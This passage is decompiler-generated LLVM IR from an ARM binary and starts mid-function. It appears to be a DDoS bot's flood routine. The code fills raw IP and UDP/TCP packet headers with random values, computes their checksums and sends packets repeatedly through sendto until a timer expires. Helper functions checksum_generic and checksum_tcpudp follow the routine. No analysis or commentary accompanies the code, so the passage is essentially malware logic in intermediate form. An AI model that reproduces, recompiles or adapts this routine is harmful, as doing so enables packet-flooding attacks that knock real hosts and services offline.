  %v3_db6c = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_db74 = add i32 %v3_db6c, 1
  store i32 %v1_db74, i32* @r5, align 4
  store i32 %v2_d920, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_db80 = load i32, i32* @r4, align 4
  %v2_db80 = add i32 %v0_db80, %v2_d920
  store i32 %v2_db80, i32* %r2.global-to-local, align 4
  %v9_db84 = icmp eq i32 %v1_db74, %arg2
  store i1 %v9_db84, i1* %cpsr_z.global-to-local, align 1
  %v3_db88 = add i32 %v2_db80, 4
  %v4_db88 = inttoptr i32 %v3_db88 to i16*
  store i16 256, i16* %v4_db88, align 2
  %v0_db8c = load i32, i32* @lr, align 4
  %v1_db8c = trunc i32 %v0_db8c to i16
  %v2_db8c = load i32, i32* %r2.global-to-local, align 4
  %v3_db8c = add i32 %v2_db8c, 2
  %v4_db8c = inttoptr i32 %v3_db8c to i16*
  store i16 %v1_db8c, i16* %v4_db8c, align 2
  %v0_db90 = load i32, i32* @r5, align 4
  store i32 %v0_db90, i32* %stack_var_-44, align 4
  %v8_db94 = icmp slt i32 %v1_db74, %arg2
  br i1 %v8_db94, label %dec_label_pc_da48, label %dec_label_pc_db98

dec_label_pc_db98:                                ; preds = %dec_label_pc_db68, %dec_label_pc_dd0c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 %v2_d9a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d9a8, label %dec_label_pc_dd0c, label %dec_label_pc_dbac

dec_label_pc_dbac:                                ; preds = %dec_label_pc_db98
  store i32 %v2_d920, i32* %r1.global-to-local, align 4
  %v1_dbb0 = load i32, i32* @sl, align 4
  %v2_dbb0 = add i32 %v1_dbb0, %v2_d920
  store i32 %v2_dbb0, i32* %r3.global-to-local, align 4
  %v1_dbb4 = add i32 %v2_dbb0, 47
  store i32 %v1_dbb4, i32* @fp, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_dbbc = add i32 %v2_dbb0, 27
  store i32 %v1_dbbc, i32* @sb, align 4
  %v9_dc98 = icmp eq i32 %v3_d998, ptrtoint ([3 x i8]* @global_var_ffff.36 to i32)
  %v9_dbc8 = icmp eq i32 %v3_d99c, ptrtoint ([3 x i8]* @global_var_ffff.36 to i32)
  br label %dec_label_pc_dc84

dec_label_pc_dbc4:                                ; preds = %dec_label_pc_dc84
  store i32 %v3_d99c, i32* %ip.global-to-local, align 4
  store i1 %v9_dbc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dbc8, label %dec_label_pc_dcc0, label %dec_label_pc_dbd0

dec_label_pc_dbd0:                                ; preds = %dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge, %dec_label_pc_dbc4
  %v1_dbd4 = phi i32 [ %v1_dbd4.pre, %dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge ], [ ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), %dec_label_pc_dbc4 ]
  store i32 %v3_d9a0, i32* @lr, align 4
  %v9_dbd4 = icmp eq i32 %v3_d9a0, %v1_dbd4
  store i1 %v9_dbd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dbd4, label %dec_label_pc_dcd4, label %dec_label_pc_dbdc

dec_label_pc_dbdc:                                ; preds = %dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge, %dec_label_pc_dbd0
  %v1_dbe0 = phi i32 [ %v1_dbe0.pre, %dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge ], [ %v1_dbd4, %dec_label_pc_dbd0 ]
  store i32 %v3_d9a4, i32* %r0.global-to-local, align 4
  %v9_dbe0 = icmp eq i32 %v3_d9a4, %v1_dbe0
  store i1 %v9_dbe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dbe0, label %dec_label_pc_dce8, label %dec_label_pc_dbe8

dec_label_pc_dbe8:                                ; preds = %dec_label_pc_dcd4, %dec_label_pc_dbdc, %dec_label_pc_dce8
  %v0_dbe8 = load i32, i32* @r7, align 4
  store i32 %v0_dbe8, i32* %r0.global-to-local, align 4
  %v0_dbec = load i32, i32* @sl, align 4
  store i32 %v0_dbec, i32* %r1.global-to-local, align 4
  %v2_dbf0 = call i32 @rand_alphastr(i32 %v0_dbe8, i32 %v0_dbec)
  %v0_dbf4 = load i32, i32* @r8, align 4
  %v1_dbf4 = trunc i32 %v0_dbf4 to i8
  %v2_dbf4 = load i32, i32* @r7, align 4
  %v3_dbf4 = load i32, i32* @sl, align 4
  %v4_dbf4 = add i32 %v3_dbf4, %v2_dbf4
  %v5_dbf4 = inttoptr i32 %v4_dbf4 to i8*
  store i8 %v1_dbf4, i8* %v5_dbf4, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_dbfc = load i32, i32* @r8, align 4
  %v1_dbfc = trunc i32 %v0_dbfc to i16
  %v2_dbfc = load i32, i32* @r4, align 4
  %v3_dbfc = add i32 %v2_dbfc, 10
  %v4_dbfc = inttoptr i32 %v3_dbfc to i16*
  store i16 %v1_dbfc, i16* %v4_dbfc, align 2
  %v0_dc00 = load i32, i32* @r4, align 4
  store i32 %v0_dc00, i32* @r0, align 4
  %v2_dc04 = call i32 @checksum_generic(i32 %v0_dc00, i32 20)
  %v3_dc04 = trunc i32 %v2_dc04 to i16
  store i32 %v2_dc04, i32* %r0.global-to-local, align 4
  %v3_dc08 = load i32, i32* @r4, align 4
  %v4_dc08 = add i32 %v3_dc08, 10
  %v5_dc08 = inttoptr i32 %v4_dc08 to i16*
  store i16 %v3_dc04, i16* %v5_dc08, align 2
  %v0_dc0c = load i32, i32* @r6, align 4
  store i32 %v0_dc0c, i32* @r1, align 4
  %v1_dc10 = add i32 %v0_dc0c, 4
  %v2_dc10 = inttoptr i32 %v1_dc10 to i16*
  %v3_dc10 = load i16, i16* %v2_dc10, align 2
  %v4_dc10 = zext i16 %v3_dc10 to i32
  store i32 %v4_dc10, i32* %r2.global-to-local, align 4
  %v0_dc14 = load i32, i32* @r8, align 4
  %v1_dc14 = trunc i32 %v0_dc14 to i16
  %v3_dc14 = add i32 %v0_dc0c, 6
  %v4_dc14 = inttoptr i32 %v3_dc14 to i16*
  store i16 %v1_dc14, i16* %v4_dc14, align 2
  %v0_dc18 = load i32, i32* @sb, align 4
  store i32 %v0_dc18, i32* %r3.global-to-local, align 4
  %v0_dc1c = load i32, i32* @r4, align 4
  store i32 %v0_dc1c, i32* %r0.global-to-local, align 4
  %v4_dc20 = call i32 @checksum_tcpudp(i32 %v0_dc1c, i32 %v0_dc0c, i32 %v4_dc10, i32 %v0_dc18)
  %v5_dc20 = trunc i32 %v4_dc20 to i16
  store i32 %v4_dc20, i32* %r0.global-to-local, align 4
  %v3_dc24 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_dc24, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_dc2c = mul i32 %v3_dc24, 32
  store i32 %v3_dc2c, i32* %ip.global-to-local, align 4
  %v3_dc30 = load i32, i32* @r6, align 4
  %v4_dc30 = add i32 %v3_dc30, 6
  %v5_dc30 = inttoptr i32 %v4_dc30 to i16*
  store i16 %v5_dc20, i16* %v5_dc30, align 2
  store i32 %stack_var_-2184.0, i32* %r2.global-to-local, align 4
  %v0_dc38 = load i32, i32* @r6, align 4
  %v1_dc38 = add i32 %v0_dc38, 2
  %v2_dc38 = inttoptr i32 %v1_dc38 to i16*
  %v3_dc38 = load i16, i16* %v2_dc38, align 2
  %v4_dc38 = zext i16 %v3_dc38 to i32
  store i32 %v4_dc38, i32* @r6, align 4
  %v0_dc3c = load i32, i32* %ip.global-to-local, align 4
  %v1_dc3c = load i32, i32* %r3.global-to-local, align 4
  %tmp135 = mul i32 %v1_dc3c, -8
  %v5_dc3c = add i32 %v0_dc3c, %tmp135
  %v1_dc40 = load i32, i32* %r1.global-to-local, align 4
  %v2_dc40 = add i32 %v1_dc40, %v5_dc3c
  store i32 %v2_dc40, i32* %ip.global-to-local, align 4
  %v2_dc44 = add i32 %v2_dc40, 4
  %v3_dc44 = inttoptr i32 %v2_dc44 to i32*
  store i32 %stack_var_-2184.0, i32* %v3_dc44, align 4
  %v0_dc48 = load i32, i32* @r6, align 4
  %v1_dc48 = trunc i32 %v0_dc48 to i16
  %v2_dc48 = load i32, i32* %ip.global-to-local, align 4
  %v3_dc48 = add i32 %v2_dc48, 2
  %v4_dc48 = inttoptr i32 %v3_dc48 to i16*
  store i16 %v1_dc48, i16* %v4_dc48, align 2
  %v0_dc4c = load i32, i32* @r4, align 4
  store i32 %v0_dc4c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_d934, i32* %r0.global-to-local, align 4
  %v0_dc58 = load i32, i32* @fp, align 4
  store i32 %v0_dc58, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_dc60 = load i32, i32* %ip.global-to-local, align 4
  %v6_dc68 = call i32 @__libc_sendto(i32 %v3_d934, i32 %v0_dc4c, i32 %v0_dc58, i32 16384, i32 %v0_dc60, i32 16)
  %v3_dc6c = load i32, i32* %stack_var_-44, align 4
  %v1_dc70 = add i32 %v3_dc6c, 1
  store i32 %v1_dc70, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_dc78 = icmp eq i32 %v1_dc70, %arg2
  store i1 %v9_dc78, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_dc70, i32* %stack_var_-44, align 4
  %v7_dc80 = icmp slt i32 %v1_dc70, %arg2
  br i1 %v7_dc80, label %dec_label_pc_dc84, label %dec_label_pc_dd0c

dec_label_pc_dc84:                                ; preds = %dec_label_pc_dbe8, %dec_label_pc_dbac
  %v1_dc90 = phi i32 [ %v1_dc70, %dec_label_pc_dbe8 ], [ 0, %dec_label_pc_dbac ]
  store i32 %v2_d6e4, i32* %r2.global-to-local, align 4
  store i32 %v3_d998, i32* %r3.global-to-local, align 4
  %v4_dc90 = mul i32 %v1_dc90, 4
  %v5_dc90 = add i32 %v4_dc90, %v2_d6e4
  %v6_dc90 = inttoptr i32 %v5_dc90 to i32*
  %v7_dc90 = load i32, i32* %v6_dc90, align 4
  store i32 %v7_dc90, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* @r5, align 4
  store i1 %v9_dc98, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* @r8, align 4
  %v1_dca0 = add i32 %v7_dc90, 20
  store i32 %v1_dca0, i32* @r6, align 4
  %v1_dca4 = add i32 %v7_dc90, 41
  store i32 %v1_dca4, i32* @r7, align 4
  br i1 %v9_dc98, label %dec_label_pc_dcac, label %dec_label_pc_dbc4

dec_label_pc_dcac:                                ; preds = %dec_label_pc_dc84
  %v0_dcac = call i32 @rand_next()
  %v1_dcac = trunc i32 %v0_dcac to i16
  store i32 %v0_dcac, i32* %r0.global-to-local, align 4
  store i32 %v3_d99c, i32* %ip.global-to-local, align 4
  %v1_dcb4 = load i32, i32* @r5, align 4
  %v9_dcb4 = icmp eq i32 %v3_d99c, %v1_dcb4
  store i1 %v9_dcb4, i1* %cpsr_z.global-to-local, align 1
  %v3_dcb8 = load i32, i32* @r4, align 4
  %v4_dcb8 = add i32 %v3_dcb8, 4
  %v5_dcb8 = inttoptr i32 %v4_dcb8 to i16*
  store i16 %v1_dcac, i16* %v5_dcb8, align 2
  br i1 %v9_dcb4, label %dec_label_pc_dcc0, label %dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge

dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge:    ; preds = %dec_label_pc_dcac
  %v1_dbd4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dbd0

dec_label_pc_dcc0:                                ; preds = %dec_label_pc_dcac, %dec_label_pc_dbc4
  %v0_dcc0 = call i32 @rand_next()
  %v1_dcc0 = trunc i32 %v0_dcc0 to i16
  store i32 %v0_dcc0, i32* %r0.global-to-local, align 4
  store i32 %v3_d9a0, i32* @lr, align 4
  %v1_dcc8 = load i32, i32* @r5, align 4
  %v9_dcc8 = icmp eq i32 %v3_d9a0, %v1_dcc8
  store i1 %v9_dcc8, i1* %cpsr_z.global-to-local, align 1
  %v3_dccc = load i32, i32* @r4, align 4
  %v4_dccc = add i32 %v3_dccc, 20
  %v5_dccc = inttoptr i32 %v4_dccc to i16*
  store i16 %v1_dcc0, i16* %v5_dccc, align 2
  br i1 %v9_dcc8, label %dec_label_pc_dcd4, label %dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge

dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge:    ; preds = %dec_label_pc_dcc0
  %v1_dbe0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dbdc

dec_label_pc_dcd4:                                ; preds = %dec_label_pc_dcc0, %dec_label_pc_dbd0
  %v0_dcd4 = call i32 @rand_next()
  %v1_dcd4 = trunc i32 %v0_dcd4 to i16
  %v3_dcd8 = load i32, i32* @r6, align 4
  %v4_dcd8 = add i32 %v3_dcd8, 2
  %v5_dcd8 = inttoptr i32 %v4_dcd8 to i16*
  store i16 %v1_dcd4, i16* %v5_dcd8, align 2
  store i32 %v3_d9a4, i32* %r0.global-to-local, align 4
  %v1_dce0 = load i32, i32* @r5, align 4
  %v9_dce0 = icmp eq i32 %v3_d9a4, %v1_dce0
  store i1 %v9_dce0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dce0, label %dec_label_pc_dce8, label %dec_label_pc_dbe8

dec_label_pc_dce8:                                ; preds = %dec_label_pc_dcd4, %dec_label_pc_dbdc
  %v0_dce8 = call i32 @rand_next()
  %v1_dce8 = trunc i32 %v0_dce8 to i16
  store i32 %v0_dce8, i32* %r0.global-to-local, align 4
  %v3_dcec = load i32, i32* @r4, align 4
  %v4_dcec = add i32 %v3_dcec, 28
  %v5_dcec = inttoptr i32 %v4_dcec to i16*
  store i16 %v1_dce8, i16* %v5_dcec, align 2
  br label %dec_label_pc_dbe8

dec_label_pc_dcf4:                                ; preds = %dec_label_pc_d944
  store i32 %v3_d934, i32* %r0.global-to-local, align 4
  %v1_dcf8 = call i32 @__GI___libc_close(i32 %v3_d934)
  store i32 %v1_dcf8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dcfc

dec_label_pc_dcfc:                                ; preds = %dec_label_pc_dd0c, %dec_label_pc_d91c, %dec_label_pc_d904, %dec_label_pc_dcf4
  %v1_dd08 = phi i32 [ %v3_d934, %dec_label_pc_d91c ], [ %v2_d910, %dec_label_pc_d904 ], [ %v1_dcf8, %dec_label_pc_dcf4 ], [ %v2_dd10, %dec_label_pc_dd0c ]
  store i32 %v18_d6b4, i32* %sb.global-to-local, align 4
  store i32 %v27_d6b4, i32* %lr.global-to-local, align 4
  ret i32 %v1_dd08

dec_label_pc_dd0c.critedge:                       ; preds = %dec_label_pc_d96c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br label %dec_label_pc_dd0c

dec_label_pc_dd0c:                                ; preds = %dec_label_pc_dbe8, %dec_label_pc_dd0c.critedge, %dec_label_pc_db98
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_dd10 = call i32 @__GI_time(i32* null)
  store i32 %v2_dd10, i32* %r0.global-to-local, align 4
  %v9_dd18 = icmp eq i32 %v2_d910, %v2_dd10
  store i1 %v9_dd18, i1* %cpsr_z.global-to-local, align 1
  %v6_dd1c = icmp slt i32 %v2_d910, %v2_dd10
  br i1 %v6_dd1c, label %dec_label_pc_dcfc, label %dec_label_pc_db98

dec_label_pc_dd24:                                ; preds = %dec_label_pc_d8bc, %bb113
  %v0_d8c4.lcssa = phi i32 [ %v1_d890, %dec_label_pc_d8bc ], [ %v0_d8c4, %bb113 ]
  %v2_dd28 = sub i32 %v0_d8c4.lcssa, %v0_d86c
  store i32 %v2_dd28, i32* @r4, align 4
  %v2_dd2c = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_d880, i32* %r1.global-to-local, align 4
  store i32 %v2_dd2c, i32* %r0.global-to-local, align 4
  store i32 %v2_dd28, i32* %r2.global-to-local, align 4
  %v3_dd3c = call i32 @util_memcpy(i32 %v2_dd2c, i32 %v2_d880, i32 %v2_dd28)
  %v2_dd40 = ptrtoint i32* %stack_var_-40 to i32
  %v1_dd44 = load i32, i32* @r4, align 4
  %v2_dd44 = add i32 %v1_dd44, %v2_dd40
  store i32 %v2_dd44, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_dd2c, i32* @r0, align 4
  %v3_dd50 = add i32 %v2_dd44, -36
  %v4_dd50 = inttoptr i32 %v3_dd50 to i8*
  store i8 0, i8* %v4_dd50, align 1
  %v1_dd54 = call i32 @inet_addr(i32 %v2_dd2c)
  store i32 %v1_dd54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_dd60:                                ; preds = %dec_label_pc_d8d0
  store i32 104859200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_dd70:                                ; preds = %dec_label_pc_d8d0
  store i32 134744072, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_dd84:                                ; preds = %dec_label_pc_d8d0
  store i32 707416650, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_d904

; uselistorder directives
  uselistorder i32 %v1_dd54, { 1, 0 }
  uselistorder i32 %v2_dd2c, { 0, 1, 3, 2 }
  uselistorder i32 %v2_dd28, { 1, 0, 2 }
  uselistorder i32 %v2_dd10, { 1, 2, 3, 0 }
  uselistorder i32 %v0_dce8, { 1, 0 }
  uselistorder i32 %v0_dcc0, { 1, 0 }
  uselistorder i32 %v0_dcac, { 1, 0 }
  uselistorder i32 %v7_dc90, { 1, 0, 2 }
  uselistorder i32 %v1_dc70, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v4_dc20, { 1, 0 }
  uselistorder i32 %v0_dc0c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_dc04, { 1, 0 }
  uselistorder i32 %v1_db50.pre, { 1, 0 }
  uselistorder i32 %v2_db48, { 1, 0 }
  uselistorder i32 %v2_db4817, { 1, 0 }
  uselistorder i32 %v0_db5419, { 1, 0 }
  uselistorder i32 %v1_db40, { 1, 0 }
  uselistorder i32 %v3_da2c, { 1, 0 }
  uselistorder i32 %v3_da18, { 1, 0 }
  uselistorder i32 %v3_d9d8, { 1, 0 }
  uselistorder i32 %v1_d9ac, { 1, 0 }
  uselistorder i32 %v3_d9a0, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_d99c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_d998, { 1, 0 }
  uselistorder i1 %v7_d964, { 1, 0 }
  uselistorder i1 %v7_d938, { 1, 0 }
  uselistorder i32 %v3_d934, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_d920, { 0, 13, 1, 8, 3, 6, 7, 5, 9, 11, 10, 4, 12, 2 }
  uselistorder i32 %v2_d910, { 2, 1, 0, 3 }
  uselistorder i32 %v0_d90c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-2184.0, { 0, 3, 2, 1 }
  uselistorder i32 %v1_d8d4, { 1, 0 }
  uselistorder i32 %v0_d8d0, { 1, 0 }
  uselistorder i32 %v1_d8c4, { 1, 2, 0 }
  uselistorder i1 %v7_d8b0, { 1, 0 }
  uselistorder i32 %v1_d8ac, { 1, 0, 2 }
  uselistorder i1 %v8_d8a4, { 1, 0 }
  uselistorder i1 %v7_d8a0, { 1, 0 }
  uselistorder i32 %v1_d894, { 1, 0 }
  uselistorder i8 %v2_d888, { 2, 0, 1, 3 }
  uselistorder i32 %v0_d88c, { 1, 0 }
  uselistorder i32 %v0_d8ac, { 1, 2, 3, 0 }
  uselistorder i32 %v2_d880, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d87c, { 1, 0, 2 }
  uselistorder i32 %v0_d874, { 1, 0, 2, 3 }
  uselistorder i1 %v7_d86c, { 1, 0 }
  uselistorder i32 %v0_d86c, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_d810, { 1, 0, 2, 3 }
  uselistorder i32 %v7_d7b0, { 2, 0, 1, 3 }
  uselistorder i32 %v6_d794, { 0, 2, 1 }
  uselistorder i32 %v7_d77c, { 1, 0, 2 }
  uselistorder i32 %v1_d764, { 1, 0 }
  uselistorder i32 %v8_d720, { 1, 0, 2 }
  uselistorder i32 %v1_d708, { 1, 0 }
  uselistorder i32 %v6_d6fc, { 1, 0 }
  uselistorder i32 %v2_d6e4, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 37, 8, 5, 6, 7, 9, 10, 11, 2, 12, 36, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 1, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 4, 5, 6, 7, 8, 9, 2, 49, 50, 10, 48, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 42, 41, 43, 45, 44, 47, 46, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 67, 7, 5, 8, 6, 9, 11, 10, 12, 14, 13, 15, 17, 16, 18, 19, 21, 20, 22, 23, 24, 32, 25, 26, 27, 28, 29, 30, 31, 36, 33, 34, 35, 37, 39, 38, 41, 40, 42, 43, 44, 46, 45, 47, 48, 50, 49, 51, 53, 52, 55, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 29, 28, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 32, 1, 2, 3, 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 41, { 4, 5, 6, 0, 1, 7, 2, 8, 3, 9 }
  uselistorder i8 17, { 1, 2, 0 }
  uselistorder i8 -16, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 707416650, { 1, 0 }
  uselistorder i32 104859200, { 1, 0 }
  uselistorder i32 37, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 53, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), { 48, 0, 1, 31, 32, 49, 10, 50, 11, 51, 52, 2, 3, 12, 53, 13, 54, 55, 4, 56, 33, 34, 57, 14, 58, 15, 59, 35, 36, 60, 16, 37, 61, 62, 6, 63, 5, 38, 17, 64, 39, 65, 18, 66, 19, 67, 68, 7, 69, 40, 41, 70, 20, 71, 21, 72, 22, 73, 23, 74, 75, 42, 43, 76, 24, 77, 25, 78, 45, 79, 8, 44, 80, 26, 81, 27, 82, 28, 83, 84, 9, 85, 46, 47, 86, 29, 87, 30, 88, 89 }
  uselistorder i32 %arg2, { 3, 4, 6, 7, 0, 1, 5, 2, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_dd0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dcfc, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_dbe8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_db98, { 1, 0 }
  uselistorder label %dec_label_pc_db68, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %bb128, { 1, 0 }
  uselistorder label %bb126, { 1, 0 }
  uselistorder label %dec_label_pc_d8c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d8bc, { 1, 0 }
  uselistorder label %dec_label_pc_d8b0, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_ddbc, label %dec_label_pc_dda4

dec_label_pc_dda4:                                ; preds = %entry
  %v0_ddac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_dda8

dec_label_pc_dda8:                                ; preds = %dec_label_pc_dda8, %dec_label_pc_dda4
  %v0_ddb4 = phi i32 [ %v2_ddb4, %dec_label_pc_dda8 ], [ 0, %dec_label_pc_dda4 ]
  %v0_ddac = phi i32 [ %v5_ddac, %dec_label_pc_dda8 ], [ %v0_ddac.pre, %dec_label_pc_dda4 ]
  %v0_dda8 = phi i32 [ %v1_dda8, %dec_label_pc_dda8 ], [ %arg1, %dec_label_pc_dda4 ]
  %v1_dda8 = add i32 %v0_dda8, -2
  %v1_ddac = inttoptr i32 %v0_ddac to i16*
  %v2_ddac = load i16, i16* %v1_ddac, align 2
  %v3_ddac = zext i16 %v2_ddac to i32
  %v5_ddac = add i32 %v0_ddac, -2
  store i32 %v5_ddac, i32* @r0, align 4
  %v2_ddb4 = add i32 %v3_ddac, %v0_ddb4
  %v1_dda8.cmp = icmp ugt i32 %v1_dda8, 1
  br i1 %v1_dda8.cmp, label %dec_label_pc_dda8, label %dec_label_pc_ddbc.loopexit

dec_label_pc_ddbc.loopexit:                       ; preds = %dec_label_pc_dda8
  br label %dec_label_pc_ddbc

dec_label_pc_ddbc:                                ; preds = %entry, %dec_label_pc_ddbc.loopexit
  %v1_ddc4 = phi i32 [ %v2_ddb4, %dec_label_pc_ddbc.loopexit ], [ 0, %entry ]
  %v0_ddbc = phi i32 [ %v1_dda8, %dec_label_pc_ddbc.loopexit ], [ %arg1, %entry ]
  %v7_ddbc = icmp eq i32 %v0_ddbc, 1
  br i1 %v7_ddbc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_ddbc
  %v1_ddc0 = load i32, i32* @r0, align 4
  %v2_ddc0 = inttoptr i32 %v1_ddc0 to i8*
  %v3_ddc0 = load i8, i8* %v2_ddc0, align 1
  %v4_ddc0 = zext i8 %v3_ddc0 to i32
  %v3_ddc4 = add i32 %v1_ddc4, %v4_ddc0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ddbc, %bb
  %v0_ddc8 = phi i32 [ %v1_ddc4, %dec_label_pc_ddbc ], [ %v3_ddc4, %bb ]
  %v3_ddcc = urem i32 %v0_ddc8, 65536
  %v4_ddd0 = udiv i32 %v0_ddc8, 65536
  %v5_ddd0 = add nuw nsw i32 %v4_ddd0, %v3_ddcc
  %v4_ddd4 = udiv i32 %v5_ddd0, 65536
  %v5_ddd4 = add nuw nsw i32 %v4_ddd4, %v5_ddd0
  %v1_ddd8 = urem i32 %v5_ddd4, 65536
  %v3_dde0 = xor i32 %v1_ddd8, 65535
  ret i32 %v3_dde0

; uselistorder directives
  uselistorder i32 %v5_ddd0, { 1, 0 }
  uselistorder i32 %v5_ddac, { 1, 0 }
  uselistorder i32 %v1_dda8, { 1, 0, 2 }
  uselistorder i32 %v0_ddac, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_ddbc, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_ddf8 = add i32 %arg1, 12
  %v2_ddf8 = inttoptr i32 %v1_ddf8 to i32*
  %v3_ddf8 = load i32, i32* %v2_ddf8, align 4
  %v1_ddfc = add i32 %arg1, 16
  %v2_ddfc = inttoptr i32 %v1_ddfc to i32*
  %v3_ddfc = load i32, i32* %v2_ddfc, align 4
  %v7_de00 = icmp sgt i32 %arg3, 1
  br i1 %v7_de00, label %dec_label_pc_de0c.preheader, label %dec_label_pc_de20

dec_label_pc_de0c.preheader:                      ; preds = %entry
  %v0_de10.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_de0c

dec_label_pc_de0c:                                ; preds = %dec_label_pc_de0c.preheader, %dec_label_pc_de0c
  %v0_de18 = phi i32 [ 0, %dec_label_pc_de0c.preheader ], [ %v2_de18, %dec_label_pc_de0c ]
  %v0_de10 = phi i32 [ %v0_de10.pre, %dec_label_pc_de0c.preheader ], [ %v5_de10, %dec_label_pc_de0c ]
  %v0_de0c = phi i32 [ %arg3, %dec_label_pc_de0c.preheader ], [ %v1_de0c, %dec_label_pc_de0c ]
  %v1_de0c = add nsw i32 %v0_de0c, -2
  %v1_de10 = inttoptr i32 %v0_de10 to i16*
  %v2_de10 = load i16, i16* %v1_de10, align 2
  %v3_de10 = zext i16 %v2_de10 to i32
  %v5_de10 = add i32 %v0_de10, -2
  store i32 %v5_de10, i32* @r1, align 4
  %v2_de18 = add i32 %v3_de10, %v0_de18
  %v8_de1c = icmp sgt i32 %v1_de0c, 1
